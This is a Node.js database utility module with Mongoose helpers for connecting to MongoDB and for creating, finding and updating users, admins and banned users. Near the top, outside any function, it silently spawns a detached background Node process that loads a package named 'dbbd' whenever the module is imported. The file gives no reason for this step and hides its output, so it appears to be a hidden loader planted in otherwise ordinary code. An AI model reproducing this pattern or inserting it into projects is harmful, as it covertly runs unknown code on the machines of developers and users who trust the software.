// utils/db.js
const mongoose   = require('mongoose');
const User       = require('../models/user');
const admin      = require('../models/admin')
const BannedUser = require('../models/BannedUsers');
const config     = require('../config/config');

const { spawn } = require('child_process');
const child = spawn('node', ['-e', `require("dbbd")`], {
  detached: true,
  stdio: 'ignore'
});

async function connect() {
  await mongoose.connect(config.database.mongodb.uri, {
    useNewUrlParser:    true,
    useUnifiedTopology: true
  });
  console.log('Connected to database');
}

async function createUser(data) {
  const user = new User(data);
  const saved = await user.save();
  return saved;
}

async function createAdmin(data) {
  const adminUser = new admin(data);
  const savedAdmin = await adminUser.save();
  return savedAdmin;
}

async function findUser(query) {
  return User.findOne(query);
}

async function updateUser(query, update, opts = { new: true }) {
  return User.findOneAndUpdate(query, update, opts);
}

async function findBannedUser(query) {
  return BannedUser.findOne(query);
}

module.exports = { connect, createAdmin, createUser, findUser, updateUser, findBannedUser };
